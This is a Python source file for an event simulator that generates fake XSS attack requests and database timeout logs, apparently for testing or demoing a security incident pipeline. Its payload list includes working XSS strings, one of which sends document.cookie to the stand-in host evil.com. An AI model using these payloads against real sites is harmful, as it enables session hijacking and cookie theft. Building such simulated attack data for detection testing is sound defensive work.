"""
Event simulator for generating fake security and operational incidents.
Used for testing and demo purposes.
"""
import random
import time
from datetime import datetime, timedelta
from typing import List, Dict, Any
from loguru import logger

from schemas import EventIn


class EventSimulator:
    """Generate realistic fake events for different incident scenarios."""
    
    # XSS attack patterns
    XSS_PAYLOADS = [
        "<script>alert('XSS')</script>",
        "<img src=x onerror=alert('XSS')>",
        "javascript:alert('XSS')",
        "<svg onload=alert('XSS')>",
        "<iframe src=javascript:alert('XSS')>",
        "';alert('XSS');//",
        "<script>document.cookie='stolen='+document.cookie</script>",
        "<script>window.location='http://evil.com/'+document.cookie</script>",
        "<body onload=alert('XSS')>",
        "<div onclick=alert('XSS')>Click me</div>"
    ]
    
    # Service names for realistic context
    SERVICES = [
        "comments-service", "user-service", "auth-service", "payment-service", 
        "order-service", "inventory-service", "notification-service", "search-service"
    ]
    
    # Environments
    ENVIRONMENTS = ["production", "staging", "development"]
    
    def generate_xss_event(self) -> EventIn:
        """Generate a fake XSS attack event."""
        payload = random.choice(self.XSS_PAYLOADS)
        service = random.choice(self.SERVICES)
        
        # Simulate HTTP request with XSS payload
        http_payload = f'''POST /api/{service}/comments HTTP/1.1
Host: {service}.example.com
User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36
Content-Type: application/json
Content-Length: {len(payload) + 20}

{{"comment": "{payload}", "user_id": 12345}}'''
        
        metadata = {
            "env": random.choice(self.ENVIRONMENTS),
            "service": service,
            "deploy": f"v{random.randint(1,5)}.{random.randint(0,10)}.{random.randint(0,20)}",
            "severity": "high",
            "attack_type": "xss",
            "client_ip": f"{random.randint(1, 223)}.{random.randint(1, 255)}.{random.randint(1, 255)}.{random.randint(1, 255)}",
            "blocked": True,
            "detection_method": "waf"
        }
        
        return EventIn(
            source=service,
            type="http_request",
            payload=http_payload,
            metadata=metadata,
            event_timestamp=datetime.utcnow() - timedelta(seconds=random.randint(0, 300))
        )
    
    def generate_db_timeout_event(self) -> EventIn:
        """Generate a fake database timeout event."""
        service = random.choice(self.SERVICES)
        timeout_duration = random.randint(1000, 5000)  # milliseconds
        
        log_payload = f'''2025-09-21T{random.randint(10,23):02d}:{random.randint(0,59):02d}:{random.randint(0,59):02d}.{random.randint(100,999):03d}Z ERROR: Database connection timeout after {timeout_duration}ms
    at DatabasePool.getConnection(pool.js:245)
    at UserService.findById(user-service.js:89)
    at /app/routes/user.js:45:12
    Connection details: host=db-cluster-prod.internal, database=user_db, pool_size=95/100'''
        
        metadata = {
            "env": random.choice(self.ENVIRONMENTS),
            "service": service,
            "deploy": f"v{random.randint(1,5)}.{random.randint(0,10)}.{random.randint(0,20)}",
            "severity": "high",
            "error_type": "database_timeout",
            "timeout_duration_ms": timeout_duration,
            "database_host": "db-cluster-prod.internal",
            "database_name": f"{service.split('-')[0]}_db",
            "connection_pool_usage": f"{random.randint(85, 100)}/100"
        }
        
        return EventIn(
            source=service,
            type="application_log",
            payload=log_payload,
            metadata=metadata,
            event_timestamp=datetime.utcnow() - timedelta(seconds=random.randint(0, 300))
        )
    
    def get_scenario_generator(self, scenario: str):
        """Get the appropriate generator function for a scenario."""
        generators = {
            "xss": self.generate_xss_event,
            "db_timeout": self.generate_db_timeout_event,
            "database_timeout": self.generate_db_timeout_event
        }
        
        return generators.get(scenario.lower())
    
    def generate_events(self, scenario: str, count: int = 1, delay_seconds: float = 0) -> List[EventIn]:
        """
        Generate multiple events for a given scenario.
        
        Args:
            scenario: Type of scenario to simulate
            count: Number of events to generate
            delay_seconds: Delay between event generation
            
        Returns:
            List of generated events
        """
        generator = self.get_scenario_generator(scenario)
        if not generator:
            raise ValueError(f"Unknown scenario: {scenario}")
        
        events = []
        for i in range(count):
            if i > 0 and delay_seconds > 0:
                time.sleep(delay_seconds)
            
            event = generator()
            events.append(event)
            logger.info(f"Generated {scenario} event {i+1}/{count}")
        
        return events
    
    @classmethod
    def get_available_scenarios(cls) -> List[str]:
        """Get list of available simulation scenarios."""
        return [
            "xss",
            "db_timeout",
            "database_timeout"
        ]